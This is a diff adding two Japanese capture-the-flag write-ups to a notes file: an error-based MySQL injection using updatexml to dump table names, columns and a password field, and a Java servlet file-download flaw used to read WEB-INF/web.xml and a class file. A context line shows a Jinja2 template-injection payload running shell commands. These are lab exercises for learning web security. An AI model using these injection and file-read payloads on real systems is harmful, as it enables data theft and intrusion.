@@ -29,6 +29,8 @@
 - [[ZJCTF 2019]NiZhuanSiWei](#zjctf-2019nizhuansiwei)
 - [[BJDCTF2020]Easy MD5](#bjdctf2020easy-md5)
 - [[BJDCTF 2nd]fake google](#bjdctf-2ndfake-google)
+- [[极客大挑战 2019]HardSQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019hardsql)
+- [[RoarCTF 2019]Easy Java](#roarctf-2019easy-java)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -1664,4 +1666,234 @@ tplmapを使わないとこんな感じになるらしいですがまだまだ�
 
 ```
 {% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")}}{% endif %}{% endfor %}
+```
+
+# [极客大挑战 2019]HardSQL
+
+```
+admin
+‘ or 1=1#
+```
+
+空白と=はダメっぽい???
+blindかerror basedだけどblindでもなさそうだなとはなんとなく思った。
+
+> それでは、MySQLではエラーメッセージからの情報漏洩はできないのかというと、寺田さんのブログ記事「MySQLのエラーメッセージ」にその方法が載っています。MySQLのextractvalue関数を使う方法です。extractvalue関数は、XPATH式に従って文字列の切り出しをするものです。以下のように使います。
+
+> XPath (XML Path Language)とは、XML形式の文書から、特定の部分を指定して抽出するための簡潔な構文(言語)です。 HTML形式の文書にも対応します。
+
+> エラーインジェクションには、extractvalueとupdatexmlを使用することができます。
+
+```
+名前	説明
+ExtractValue()	XPath 表記法を使用して、XML 文字列から値を抽出します
+UpdateXML()	置換後 XML フラグメントを返します
+```
+
+```
+UpdateXML(xml_target, xpath_expr, new_xml)
+
+この関数は、XML マークアップ xml_target の特定のフラグメントの一部を新しい XML フラグメント new_xml に置き換えてから、変更された XML を返します。置換された xml_target の一部は、ユーザーが指定した XPath 式 xpath_expr に一致します。MySQL 5.6.6 以前では、XPath 式に最大でも 127 文字しか含めることができませんでした。この制限は、MySQL 5.6.7 で解除されました。(Bug #13007062、Bug #62429)
+
+xpath_expr に一致する式が見つからない場合、または複数の一致が見つかった場合、この関数は元の xml_target XML フラグメントを返します。3 つの引数はすべて文字列にする必要があります。
+```
+
+そもそもupdatexmlがなにしてんのかまだよくわかってないけどとりあえず攻撃方法だけおさえておく。これからerror basedでてきたときにまた勉強すればいいっしょみたいなノリです。
+
+```sql
+admin'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1)
+```
+
+
+```
+Oracle, DB2
+CONCAT( 文字列1, 文字列2 )
+
+MySQL
+CONCAT( 文字列1, 文字列2[, 文字列3 ... ] )
+
+戻り値 : 連結された文字列
+```
+
+```sql
+GET /check.php?username=admin'or(updatexml(1,concat(0x7e,(SELECT(database())),0x7e),1))%23&password=123 HTTP/1.1
+```
+```
+XPATH syntax error: '~geek~'
+```
+```sql
+GET /check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=123 HTTP/1.1
+```
+
+```
+XPATH syntax error: '~H4rDsq1~'
+```
+```sql
+GET /check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=123 HTTP/1.1
+```
+
+```
+XPATH syntax error: '~id,username,password~'
+```
+
+```sql
+GET /check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&password=123 HTTP/1.1
+```
+
+```
+XPATH syntax error: '~flag{462203de-c0ad-4223-ac27-0f'
+```
+途中まででてる。26文字なので右側の26文字を出力させる。substrとかmidは使えないっぽい。
+```sql
+GET /check.php?username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,26)))from(H4rDsq1)),0x7e),1))%23&password=123 HTTP/1.1
+```
+```
+XPATH syntax error: '~ad-4223-ac27-0fbffe2dd2e4}~'
+```
+flag{462203de-c0ad-4223-ac27-0fbffe2dd2e4}
+
+# [RoarCTF 2019]Easy Java
+
+名前からして
+Cookie: JSESSIONID=3CD6A9F87E6506E0E672B56ED1E551F5
+がJavaで生成される特有のセッションIDっぽい気もする
+
+
+> JSESSIONIDのCookieは、セッションの作成時に作成または送信されます。セッションは、初めてコード request.getSession() または request.getSession(true) を呼び出すと作成されます。
+
+あとあるとしたらSQLインジェクション??って感じ
+
+```
+/Download?filename=help.docx
+```
+
+```
+java.io.FileNotFoundException:{help.docx}
+```
+という出力がされててここが問題な感じがする
+
+java.io.FileNotFoundExceptionというのは
+```
+java.io.FileNotFoundException: {0}
+
+[可変情報]
+{0}:ファイル名
+[意味]
+可変情報{0}に出力されたファイルが見つかりません。
+または、実行権限のないユーザでコマンドを実行した可能性があります。
+
+```
+なので、LFIがある（LFIといっていいのかはよくわからない）
+
+POSTしてみると
+```
+POST /Download HTTP/1.1
+Host: afbdf8ec-ad84-417f-9f82-823d55b6a949.node3.buuoj.cn
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: ja,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: JSESSIONID=D797E2C66230C6B8DAC85D6815B6AE05
+Upgrade-Insecure-Requests: 1
+Content-Length: 18
+
+filename=help.docx
+```
+```
+java.lang.NullPointerException
+	java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:130)
+	java.io.FileInputStream.&lt;init&gt;(FileInputStream.java:93)
+	com.wm.ctf.DownloadController.doPost(DownloadController.java:24)
+	javax.servlet.http.HttpServlet.service(HttpServlet.java:661)
+	javax.servlet.http.HttpServlet.service(HttpServlet.java:742)
+	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
+```
+
+com.wm.ctf.DownloadController.doPost(DownloadController.java:24)がヒントになる情報でjavaのサーブレットの基本的な知識が必要になってくる
+
+サーブレットのアプリケーションの基本的なディレクトリ構造はWEB-INFというディレクトリの中に設定が記述されているweb.xmlや、作成したプログラムのコンパイル結果が格納されているclassesディレクトリがある。
+
+> WEB-INF/web.xmlは、設定ファイルで、使用するサーブレットクラスを記述したり、追加したライブラリ情報を記述したりする。
+
+> classes/には、作成したコンパイルしたあとのプログラムが置かれる。
+
+
+```
+POST /Download?filename=WEB-INF/web.xml HTTP/1.1
+```
+
+```
+HTTP/1.1 200 OK
+Server: openresty
+Date: Sat, 22 Aug 2020 05:30:57 GMT
+Content-Type: application/xml
+Content-Length: 1562
+Connection: close
+Content-Disposition: attachment;filename=WEB-INF/web.xml
+
+<?xml version="1.0" encoding="UTF-8"?>
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+         version="4.0">
+
+    <welcome-file-list>
+        <welcome-file>Index</welcome-file>
+    </welcome-file-list>
+
+    <servlet>
+        <servlet-name>IndexController</servlet-name>
+        <servlet-class>com.wm.ctf.IndexController</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>IndexController</servlet-name>
+        <url-pattern>/Index</url-pattern>
+    </servlet-mapping>
+
+    <servlet>
+        <servlet-name>LoginController</servlet-name>
+        <servlet-class>com.wm.ctf.LoginController</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>LoginController</servlet-name>
+        <url-pattern>/Login</url-pattern>
+    </servlet-mapping>
+
+    <servlet>
+        <servlet-name>DownloadController</servlet-name>
+        <servlet-class>com.wm.ctf.DownloadController</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>DownloadController</servlet-name>
+        <url-pattern>/Download</url-pattern>
+    </servlet-mapping>
+
+    <servlet>
+        <servlet-name>FlagController</servlet-name>
+        <servlet-class>com.wm.ctf.FlagController</servlet-class>
+    </servlet>
+    <servlet-mapping>
+        <servlet-name>FlagController</servlet-name>
+        <url-pattern>/Flag</url-pattern>
+    </servlet-mapping>
+
+</web-app>
+```
+
+web.xmlをみると、 <servlet-class>com.wm.ctf.FlagController</servlet-class>というサーブレットのクラスがおそらくclassesディレクトリの中にある
+
+```
+POST /Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class 
+```
+
+```
+FlagController <ZmxhZ3s1MWM1ZjA1ZS1hNjc5LTQ2ZDktOTU2Mi1hODE2NDc2NWQxNTZ9Cg==
+```
+
+コンパイル結果なので一部読むことはできないが、base64でエンコードされた文字列があるのでデコードするとflagがでてくる。
+
+```
+ % echo -n 'ZmxhZ3s1MWM1ZjA1ZS1hNjc5LTQ2ZDktOTU2Mi1hODE2NDc2NWQxNTZ9Cg==^L' | base64 -d
+flag{51c5f05e-a679-46d9-9562-a8164765d156}
 ```
